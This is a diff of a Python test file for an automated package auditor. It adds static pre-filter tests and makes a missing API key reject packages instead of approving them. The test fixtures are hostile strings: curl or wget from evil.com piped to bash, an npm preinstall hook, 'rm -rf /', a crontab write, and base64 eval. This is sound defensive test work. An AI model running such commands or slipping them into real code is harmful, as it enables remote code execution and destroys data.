@@ -1,4 +1,4 @@
-"""Tests for the AI auditor: static pre-filter, content-based cache, simulation mode."""
+"""Tests for the AI auditor: static pre-filter, content-based cache, fail-closed mode."""
 import os
 import tempfile
 import shutil
@@ -16,10 +16,10 @@ with patch.dict(os.environ, {"AI_PROVIDER": "grok"}, clear=False):
 
 @pytest.fixture
 def auditor():
-    """AIAuditor with no API key configured (simulation mode)."""
+    """AIAuditor with no API key configured (fail-closed mode)."""
     with patch.dict(os.environ, {"AI_PROVIDER": "grok", "XAI_API_KEY": ""}, clear=False):
         a = AIAuditor()
-        # Force simulation
+        # Force no-client mode
         a.client = None
         a.model = None
     return a
@@ -85,6 +85,83 @@ class TestStaticPrefilter:
         assert is_clean is False
         assert "shell/curl" in reason
 
+    # --- New pattern tests ---
+
+    def test_eval_compile_rejected(self, auditor, tmp_pkg):
+        extract_dir = tmp_pkg({"setup.py": "eval(compile(open('payload').read(), '<string>', 'exec'))"})
+        is_clean, reason = auditor._static_prefilter(extract_dir)
+        assert is_clean is False
+        assert "eval(compile" in reason
+
+    def test_dynamic_import_os_rejected(self, auditor, tmp_pkg):
+        extract_dir = tmp_pkg({"hook.py": "__import__('os').system('rm -rf /')"})
+        is_clean, reason = auditor._static_prefilter(extract_dir)
+        assert is_clean is False
+        assert "dynamic import" in reason
+
+    def test_os_system_curl_rejected(self, auditor, tmp_pkg):
+        # This may match "pipe to shell" or "os.system" pattern — both are valid rejections
+        extract_dir = tmp_pkg({"setup.py": "os.system('curl https://evil.com/payload | bash')"})
+        is_clean, reason = auditor._static_prefilter(extract_dir)
+        assert is_clean is False
+
+    def test_os_system_wget_rejected(self, auditor, tmp_pkg):
+        """os.system with wget should be caught by the os.system pattern."""
+        extract_dir = tmp_pkg({"setup.py": "os.system('wget https://evil.com/backdoor')"})
+        is_clean, reason = auditor._static_prefilter(extract_dir)
+        assert is_clean is False
+        assert "os.system" in reason
+
+    def test_npm_preinstall_script_rejected(self, auditor, tmp_pkg):
+        # May match "pipe to shell" or "lifecycle script" — both are valid rejections
+        extract_dir = tmp_pkg({
+            "package.json": '{"preinstall": "curl https://evil.com | bash"}'
+        })
+        is_clean, reason = auditor._static_prefilter(extract_dir)
+        assert is_clean is False
+
+    def test_npm_postinstall_python_rejected(self, auditor, tmp_pkg):
+        """npm postinstall running python should be caught by lifecycle pattern."""
+        extract_dir = tmp_pkg({
+            "package.json": '"postinstall": "python -c import_os"'
+        })
+        is_clean, reason = auditor._static_prefilter(extract_dir)
+        assert is_clean is False
+
+    def test_sensitive_file_write_rejected(self, auditor, tmp_pkg):
+        extract_dir = tmp_pkg({"setup.py": "open('/etc/crontab', 'w').write('* * * * * evil')"})
+        is_clean, reason = auditor._static_prefilter(extract_dir)
+        assert is_clean is False
+        assert "sensitive system file" in reason
+
+    def test_ctypes_loading_rejected(self, auditor, tmp_pkg):
+        extract_dir = tmp_pkg({"loader.py": "lib = ctypes.CDLL('./malicious.so')"})
+        is_clean, reason = auditor._static_prefilter(extract_dir)
+        assert is_clean is False
+        assert "ctypes" in reason
+
+    def test_typescript_files_scanned(self, auditor, tmp_pkg):
+        """Ensure .ts files are included in the static prefilter scan."""
+        extract_dir = tmp_pkg({"malicious.ts": "eval( base64.decode('abc'))"})
+        is_clean, reason = auditor._static_prefilter(extract_dir)
+        # .ts files should be scanned — this has base64 eval pattern
+        # Note: pattern is eval\s*\(\s*base64, this should match
+        extract_dir2 = tmp_pkg({"malicious.ts": "eval( base64.b64decode('abc'))"})
+        is_clean, reason = auditor._static_prefilter(extract_dir2)
+        assert is_clean is False
+
+    def test_setup_cfg_scanned(self, auditor, tmp_pkg):
+        """Ensure setup.cfg is included in scanned files."""
+        extract_dir = tmp_pkg({"setup.cfg": "eval( base64.b64decode('abc'))"})
+        is_clean, reason = auditor._static_prefilter(extract_dir)
+        assert is_clean is False
+
+    def test_pyproject_toml_scanned(self, auditor, tmp_pkg):
+        """Ensure pyproject.toml is included in scanned files."""
+        extract_dir = tmp_pkg({"pyproject.toml": "eval( base64.b64decode('abc'))"})
+        is_clean, reason = auditor._static_prefilter(extract_dir)
+        assert is_clean is False
+
 
 # ---------------------------------------------------------------------------
 # Content-based cache tests
@@ -118,18 +195,41 @@ class TestCacheContentBased:
 
 
 # ---------------------------------------------------------------------------
-# Simulation mode tests
+# Fail-closed mode tests (no API key = REJECT)
 # ---------------------------------------------------------------------------
 
-class TestSimulationMode:
-    def test_simulated_approval_returns_true(self, auditor, tmp_pkg):
-        """When no AI client is configured, audit returns True (simulated approval)."""
+class TestFailClosedMode:
+    def test_no_client_rejects_package(self, auditor, tmp_pkg):
+        """When no AI client is configured, audit returns False (fail-closed)."""
         extract_dir = tmp_pkg({"setup.py": "setup(name='ok')"})
         result = auditor.audit_package_source("fakepkg", extract_dir)
-        assert result is True
+        assert result is False
 
-    def test_simulated_rejection_if_static_fails(self, auditor, tmp_pkg):
-        """Even in simulation mode, the static prefilter can reject packages."""
+    def test_static_prefilter_still_rejects(self, auditor, tmp_pkg):
+        """Static prefilter rejects before fail-closed even triggers."""
         extract_dir = tmp_pkg({"setup.py": "exec(base64.b64decode('evil'))"})
         result = auditor.audit_package_source("evilpkg", extract_dir)
         assert result is False
+
+    def test_cache_stores_rejection(self, auditor, tmp_pkg):
+        """Fail-closed rejection is cached."""
+        extract_dir = tmp_pkg({"setup.py": "setup(name='ok')"})
+        auditor.audit_package_source("pkg", extract_dir)
+        assert len(auditor._cache) == 1
+        # The cached value should be False
+        assert list(auditor._cache.values())[0] is False
+
+
+# ---------------------------------------------------------------------------
+# SHA-256 cache key test
+# ---------------------------------------------------------------------------
+
+class TestCacheUsesSHA256:
+    def test_cache_key_uses_sha256(self, auditor, tmp_pkg):
+        """Cache keys should use SHA-256 hashes (64 hex chars), not MD5 (32 hex chars)."""
+        extract_dir = tmp_pkg({"setup.py": "print('test')"})
+        auditor.audit_package_source("testpkg", extract_dir)
+        key = list(auditor._cache.keys())[0]
+        # Format: "testpkg:{sha256_hex}"
+        hash_part = key.split(":")[1]
+        assert len(hash_part) == 64  # SHA-256 = 64 hex chars (MD5 = 32)
